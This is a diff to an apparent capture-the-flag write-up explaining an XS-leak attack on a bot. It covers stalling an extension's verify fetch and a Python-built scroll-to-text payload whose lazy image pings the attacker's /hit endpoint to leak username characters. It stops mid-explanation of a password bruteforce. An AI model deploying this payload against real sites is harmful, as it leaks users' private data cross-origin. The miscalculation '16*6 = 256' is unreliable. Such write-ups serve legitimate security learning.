@@ -270,9 +270,23 @@ The URL restriction is rather simple and is one of the reason why we want our ow
 </html>
 ```
 
+With this what we give to the bot is our website URL but we will still access the localhost after a couple of milliseconds.
 
+The second part is more tricky, it checks for the tab URL and listen to every update of it. Looking at the code given before, we know that if the tab URL changes to an internal one, it will instantly closes except if you are a verified tab.&#x20;
 
+Any tab that isn't an internal one will be set as a verified one first but then gets checked by the <mark style="color:$success;">verifyVerifiedTab</mark> function.&#x20;
 
+The idea to bypass this is by going to non-internal website, makes the tab a verified one, makes the <mark style="color:$success;">verifyVerifiedTab</mark> doesn't change the verified status, redirect to an internal address as it would be in the same tab and counted as a verified tab and thus not get deleted.
+
+The way to do this is to make the <mark style="color:$success;">verifyVerifiedTab</mark> function suspended for a long enough time for us to redirect to the internal address.&#x20;
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+The function checks the tab by fetching to a <mark style="color:$success;">/verify</mark> endpoint of the current tab URL. The interesting part is <mark style="color:$success;">await</mark> and <mark style="color:$success;">fetch</mark> doesn't have an internal timeout mechanism. It will suspend indefinitely until either the connection is broken or the server response.
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+So we can make the bot goes to our website, it will try to verify the current  tab. it fetches to our <mark style="color:$success;">/verify</mark> endpoint and it will wait for a long long time. This way we'll bypass this extension as long as we're using the same tab.
 
 
 
@@ -296,6 +310,10 @@ This is how we will exfiltrate the username. Unfortunately, it wont be as direct
 
 Instead, we make a list of possible characters of the username and checks for characters that aren't in the username. We put a \<div> with a super long height followed with the text "IFHITNOTCHAR" and image with lazy loading. We then use two text in the STTF, <mark style="color:$warning;">`#:~:text={emoji}%0A{char_guess}&text=IFHITNOTCHAR`</mark>. if the first text, the guessed char, isn't found then the browser will auto scroll to the second text, which exist and unique, and so will trigger the image load.
 
+<figure><img src="../../.gitbook/assets/2025-09-10_22-33.png" alt=""><figcaption></figcaption></figure>
+
+So if the STTF doesn't find the first text --meaning the guessed char not in the username-- it will auto scroll to the bottom and triggers the lazy load and fetch to our attack website <mark style="color:$success;">/hit</mark> endpoint. There we will remove the character from our list of possible characters.
+
 ```python
 anchor = ""
 for emoji in EMOJIS:
@@ -313,6 +331,7 @@ anchor = f"{emoji}%0A{char}"
 payload = f"<div style='height: 10000px; width:100%; display: block;'>padding</div><div style='display: block'> IFHITNOTCHAR </div><img loading='lazy' src='{context['my_server']}/hit/{anchor}'>"
 sstf_payload = f"#:~:text={anchor}&text=IFHITNOTCHAR" 
 target_with_payload = context['target_internal'] + f"/dashboard?cok={quote(payload)}{sstf_payload}"
+return render_template("redirect.html", url=target_with_payload)
 ```
 
 After the first filtering, I now pair a single emoji with a single character one by one. This is to filter out the characters that aren't being paired by each emoji.&#x20;
@@ -355,15 +374,27 @@ We can see the possible word are only `rgtxy` or its uppercase variants, as from
 
 I didn't see this at first but it turns out that the only valid character was just lowercase alphabet. So the username must be, <mark style="color:$success;">`rgtxy`</mark>
 
-&#x20;
-
-
-
-
-
-
-
 ### Part 2 - Bruteforcing password with Error Based Resource XS Leak
+
+This part is relatively simpler than the previous part. We know that the password starts with <mark style="color:$warning;">`replicanx`</mark>. And although we need to know the whole password to know the flag, we don't really need the whole password to login.&#x20;
+
+<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>
+
+As we see here, to login we only need a substring of the password to login. With this guessing the password become exponentially feasible. before we must bruteforce 16^6 ≈ 16 million times but with this we only need to do it 16\*6 = 256 times. A very feasible number to bruteforce.&#x20;
+
+But how to bruteforce it?&#x20;
+
+<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>
+
+To login, we need to do it from an internal IP, that is, the bot must be the one who login. But then how to know if the login successful or not? We cannot directly read the bot fetch nor window.open result because of Same-Origin-Policy (SOP) which stops us from reading cross-site fetches. The bot can''t read it either as the bot and the login server uses different port and considered different origin.
+
+The answer is another XS Leaks Technique using error based events. As we only need to know yes or no
+
+
+
+
+
+
 
 
 
